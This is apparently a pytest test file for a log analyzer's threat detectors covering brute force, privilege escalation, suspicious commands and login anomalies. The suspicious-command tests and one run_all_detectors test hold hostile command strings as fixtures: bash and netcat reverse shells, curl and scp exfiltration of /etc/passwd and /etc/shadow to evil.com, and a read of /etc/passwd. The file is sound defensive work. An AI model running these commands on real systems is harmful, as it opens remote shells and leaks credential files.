"""Tests for threat detectors."""

from __future__ import annotations

from datetime import datetime, timedelta

from log_analyzer.detectors import (
    AlertSeverity,
    AnomalyDetector,
    BruteForceDetector,
    PrivilegeEscalationDetector,
    SuspiciousCommandDetector,
    run_all_detectors,
)
from log_analyzer.parsers import LogEntry, Severity


def _make_entry(
    timestamp: datetime,
    source: str = "authlog",
    hostname: str = "server1",
    message: str = "",
    severity: Severity = Severity.INFO,
    metadata: dict | None = None,
) -> LogEntry:
    """Helper to create a LogEntry for testing."""
    return LogEntry(
        timestamp=timestamp,
        source=source,
        hostname=hostname,
        message=message,
        severity=severity,
        raw=message,
        metadata=metadata or {},
    )


# ---------------------------------------------------------------------------
# BruteForceDetector tests
# ---------------------------------------------------------------------------

class TestBruteForceDetector:
    """Tests for the BruteForceDetector class."""

    def setup_method(self) -> None:
        self.detector = BruteForceDetector(threshold=3, window_seconds=60)

    def test_detect_brute_force(self) -> None:
        base_time = datetime(2024, 1, 5, 14, 0, 0)
        entries = [
            _make_entry(
                timestamp=base_time + timedelta(seconds=i * 5),
                message="Failed password for root from 10.0.0.1 port 22 ssh2",
                severity=Severity.WARNING,
                metadata={
                    "event_type": "failed_login",
                    "username": "root",
                    "source_ip": "10.0.0.1",
                },
            )
            for i in range(5)
        ]

        alerts = self.detector.detect(entries)

        assert len(alerts) >= 1
        alert = alerts[0]
        assert alert.alert_type == "brute_force"
        assert alert.source_ip == "10.0.0.1"
        assert alert.severity in (AlertSeverity.MEDIUM, AlertSeverity.HIGH)
        assert "10.0.0.1" in alert.description
        assert alert.metadata["targeted_users"] == ["root"]

    def test_no_alert_below_threshold(self) -> None:
        base_time = datetime(2024, 1, 5, 14, 0, 0)
        entries = [
            _make_entry(
                timestamp=base_time + timedelta(seconds=i * 5),
                message="Failed password",
                severity=Severity.WARNING,
                metadata={
                    "event_type": "failed_login",
                    "username": "user1",
                    "source_ip": "10.0.0.2",
                },
            )
            for i in range(2)  # Below threshold of 3
        ]

        alerts = self.detector.detect(entries)
        assert len(alerts) == 0

    def test_no_alert_outside_window(self) -> None:
        base_time = datetime(2024, 1, 5, 14, 0, 0)
        entries = [
            _make_entry(
                timestamp=base_time + timedelta(minutes=i * 5),  # 5-min gaps
                message="Failed password",
                severity=Severity.WARNING,
                metadata={
                    "event_type": "failed_login",
                    "username": "admin",
                    "source_ip": "10.0.0.3",
                },
            )
            for i in range(5)
        ]

        # With 60-second window and 5-minute gaps, should not trigger
        alerts = self.detector.detect(entries)
        assert len(alerts) == 0

    def test_multiple_ips_detected_separately(self) -> None:
        base_time = datetime(2024, 1, 5, 14, 0, 0)
        entries = []

        for ip in ["10.0.0.1", "10.0.0.2"]:
            for i in range(4):
                entries.append(
                    _make_entry(
                        timestamp=base_time + timedelta(seconds=i * 2),
                        message=f"Failed password from {ip}",
                        severity=Severity.WARNING,
                        metadata={
                            "event_type": "failed_login",
                            "username": "root",
                            "source_ip": ip,
                        },
                    )
                )

        alerts = self.detector.detect(entries)
        alert_ips = {a.source_ip for a in alerts}

        assert "10.0.0.1" in alert_ips
        assert "10.0.0.2" in alert_ips

    def test_ignores_successful_logins(self) -> None:
        base_time = datetime(2024, 1, 5, 14, 0, 0)
        entries = [
            _make_entry(
                timestamp=base_time + timedelta(seconds=i),
                message="Accepted publickey",
                severity=Severity.INFO,
                metadata={
                    "event_type": "successful_login",
                    "username": "user1",
                    "source_ip": "10.0.0.1",
                },
            )
            for i in range(10)
        ]

        alerts = self.detector.detect(entries)
        assert len(alerts) == 0


# ---------------------------------------------------------------------------
# PrivilegeEscalationDetector tests
# ---------------------------------------------------------------------------

class TestPrivilegeEscalationDetector:
    """Tests for the PrivilegeEscalationDetector class."""

    def setup_method(self) -> None:
        self.detector = PrivilegeEscalationDetector()

    def test_detect_sudo_to_root_bash(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 14, 0, 0),
            message="admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash",
            metadata={
                "event_type": "sudo_command",
                "username": "admin",
                "target_user": "root",
                "command": "/bin/bash",
            },
        )
        alerts = self.detector.detect([entry])

        assert len(alerts) == 1
        assert alerts[0].alert_type == "privilege_escalation"
        assert alerts[0].severity == AlertSeverity.HIGH
        assert "admin" in alerts[0].description

    def test_detect_sudo_passwd(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 14, 0, 0),
            message="user1 sudo passwd",
            metadata={
                "event_type": "sudo_command",
                "username": "user1",
                "target_user": "root",
                "command": "passwd root",
            },
        )
        alerts = self.detector.detect([entry])

        assert len(alerts) == 1
        assert alerts[0].alert_type == "privilege_escalation"

    def test_detect_su_session_to_root(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 14, 0, 0),
            message="pam_unix(su:session): session opened for user root by admin",
            metadata={
                "event_type": "su_session",
                "action": "opened",
                "target_user": "root",
                "by_user": "admin",
            },
        )
        alerts = self.detector.detect([entry])

        assert len(alerts) == 1
        assert alerts[0].alert_type == "privilege_escalation"
        assert alerts[0].severity == AlertSeverity.MEDIUM

    def test_no_alert_for_non_root_sudo(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 14, 0, 0),
            message="sudo command",
            metadata={
                "event_type": "sudo_command",
                "username": "admin",
                "target_user": "www-data",
                "command": "/usr/bin/systemctl restart nginx",
            },
        )
        alerts = self.detector.detect([entry])
        assert len(alerts) == 0

    def test_no_alert_for_harmless_root_command(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 14, 0, 0),
            message="sudo ls",
            metadata={
                "event_type": "sudo_command",
                "username": "admin",
                "target_user": "root",
                "command": "/usr/bin/ls /var/log",
            },
        )
        alerts = self.detector.detect([entry])
        assert len(alerts) == 0


# ---------------------------------------------------------------------------
# SuspiciousCommandDetector tests
# ---------------------------------------------------------------------------

class TestSuspiciousCommandDetector:
    """Tests for the SuspiciousCommandDetector class."""

    def setup_method(self) -> None:
        self.detector = SuspiciousCommandDetector()

    def test_detect_reverse_shell_bash(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 14, 0, 0),
            message="reverse shell",
            metadata={
                "event_type": "sudo_command",
                "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            },
        )
        alerts = self.detector.detect([entry])

        assert len(alerts) == 1
        assert alerts[0].alert_type == "reverse_shell"
        assert alerts[0].severity == AlertSeverity.CRITICAL

    def test_detect_reverse_shell_netcat(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 14, 0, 0),
            message="nc connection",
            metadata={
                "command": "nc -e /bin/sh 10.0.0.1 4444",
            },
        )
        alerts = self.detector.detect([entry])

        assert len(alerts) == 1
        assert alerts[0].alert_type == "reverse_shell"

    def test_detect_data_exfiltration_curl(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 14, 0, 0),
            message="curl exfil",
            metadata={
                "command": "curl -d @/etc/passwd http://evil.com/collect",
            },
        )
        alerts = self.detector.detect([entry])

        assert len(alerts) == 1
        assert alerts[0].alert_type == "data_exfiltration"
        assert alerts[0].severity == AlertSeverity.HIGH

    def test_detect_data_exfiltration_scp(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 14, 0, 0),
            message="scp exfil",
            metadata={
                "command": "scp /etc/shadow attacker@evil.com:/tmp/loot",
            },
        )
        alerts = self.detector.detect([entry])

        assert len(alerts) == 1
        assert alerts[0].alert_type == "data_exfiltration"

    def test_detect_reconnaissance_passwd(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 14, 0, 0),
            message="cat /etc/passwd",
            metadata={"command": "cat /etc/passwd"},
        )
        alerts = self.detector.detect([entry])

        assert len(alerts) == 1
        assert alerts[0].alert_type == "reconnaissance"
        assert alerts[0].severity == AlertSeverity.LOW

    def test_no_alert_for_benign_command(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 14, 0, 0),
            message="normal command",
            metadata={"command": "ls -la /home/user"},
        )
        alerts = self.detector.detect([entry])
        assert len(alerts) == 0


# ---------------------------------------------------------------------------
# AnomalyDetector tests
# ---------------------------------------------------------------------------

class TestAnomalyDetector:
    """Tests for the AnomalyDetector class."""

    def setup_method(self) -> None:
        self.detector = AnomalyDetector(
            unusual_hour_start=22,
            unusual_hour_end=6,
        )

    def test_detect_unusual_login_time_late_night(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 23, 30, 0),
            message="login at night",
            metadata={
                "event_type": "successful_login",
                "username": "admin",
                "source_ip": "10.0.0.1",
            },
        )
        alerts = self.detector.detect([entry])

        unusual_time_alerts = [a for a in alerts if a.alert_type == "unusual_login_time"]
        assert len(unusual_time_alerts) == 1
        assert unusual_time_alerts[0].severity == AlertSeverity.MEDIUM
        assert "admin" in unusual_time_alerts[0].description

    def test_detect_unusual_login_time_early_morning(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 3, 0, 0),
            message="login at 3am",
            metadata={
                "event_type": "successful_login",
                "username": "user1",
                "source_ip": "10.0.0.2",
            },
        )
        alerts = self.detector.detect([entry])

        unusual_time_alerts = [a for a in alerts if a.alert_type == "unusual_login_time"]
        assert len(unusual_time_alerts) == 1

    def test_no_alert_normal_login_time(self) -> None:
        entry = _make_entry(
            timestamp=datetime(2024, 1, 5, 10, 0, 0),
            message="normal login",
            metadata={
                "event_type": "successful_login",
                "username": "user1",
                "source_ip": "10.0.0.1",
            },
        )
        alerts = self.detector.detect([entry])

        unusual_time_alerts = [a for a in alerts if a.alert_type == "unusual_login_time"]
        assert len(unusual_time_alerts) == 0

    def test_detect_new_source_ip(self) -> None:
        base_time = datetime(2024, 1, 5, 10, 0, 0)

        # Baseline: logins from known IPs
        entries = []
        for i in range(6):
            entries.append(
                _make_entry(
                    timestamp=base_time + timedelta(hours=i),
                    message=f"login {i}",
                    metadata={
                        "event_type": "successful_login",
                        "username": "user1",
                        "source_ip": "10.0.0.1",
                    },
                )
            )

        # Detection window: login from a new IP
        entries.append(
            _make_entry(
                timestamp=base_time + timedelta(hours=10),
                message="new ip login",
                metadata={
                    "event_type": "successful_login",
                    "username": "user1",
                    "source_ip": "192.168.99.99",
                },
            )
        )

        alerts = self.detector.detect(entries)

        new_ip_alerts = [a for a in alerts if a.alert_type == "new_source_ip"]
        assert len(new_ip_alerts) >= 1
        assert any(a.source_ip == "192.168.99.99" for a in new_ip_alerts)

    def test_detect_volume_anomaly(self) -> None:
        base_time = datetime(2024, 1, 5, 0, 0, 0)

        entries = []
        # Normal hours: 5 events each
        for hour in range(10):
            for i in range(5):
                entries.append(
                    _make_entry(
                        timestamp=base_time + timedelta(hours=hour, minutes=i),
                        message=f"event {i}",
                    )
                )

        # Anomalous hour: 50 events
        for i in range(50):
            entries.append(
                _make_entry(
                    timestamp=base_time + timedelta(hours=10, minutes=0, seconds=i),
                    message=f"burst event {i}",
                )
            )

        alerts = self.detector.detect(entries)

        volume_alerts = [a for a in alerts if a.alert_type == "volume_anomaly"]
        assert len(volume_alerts) >= 1


# ---------------------------------------------------------------------------
# run_all_detectors tests
# ---------------------------------------------------------------------------

class TestRunAllDetectors:
    """Tests for the run_all_detectors convenience function."""

    def test_runs_all_detectors(self) -> None:
        base_time = datetime(2024, 1, 5, 14, 0, 0)

        entries = [
            # Brute force entries
            *[
                _make_entry(
                    timestamp=base_time + timedelta(seconds=i),
                    message=f"Failed password {i}",
                    severity=Severity.WARNING,
                    metadata={
                        "event_type": "failed_login",
                        "username": "root",
                        "source_ip": "10.0.0.1",
                    },
                )
                for i in range(6)
            ],
            # Privilege escalation entry
            _make_entry(
                timestamp=base_time + timedelta(minutes=5),
                message="sudo bash",
                metadata={
                    "event_type": "sudo_command",
                    "username": "admin",
                    "target_user": "root",
                    "command": "/bin/bash",
                },
            ),
            # Suspicious command entry
            _make_entry(
                timestamp=base_time + timedelta(minutes=10),
                message="reverse shell",
                metadata={
                    "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                },
            ),
        ]

        alerts = run_all_detectors(entries, brute_force_threshold=5, brute_force_window=60)

        alert_types = {a.alert_type for a in alerts}
        assert "brute_force" in alert_types
        assert "privilege_escalation" in alert_types
        assert "reverse_shell" in alert_types

    def test_results_sorted_by_timestamp(self) -> None:
        base_time = datetime(2024, 1, 5, 14, 0, 0)
        entries = [
            _make_entry(
                timestamp=base_time + timedelta(seconds=i),
                message=f"Failed password {i}",
                severity=Severity.WARNING,
                metadata={
                    "event_type": "failed_login",
                    "username": "root",
                    "source_ip": "10.0.0.1",
                },
            )
            for i in range(10)
        ]

        alerts = run_all_detectors(entries, brute_force_threshold=3, brute_force_window=60)

        for i in range(len(alerts) - 1):
            assert alerts[i].timestamp <= alerts[i + 1].timestamp

    def test_empty_input(self) -> None:
        alerts = run_all_detectors([])
        assert alerts == []
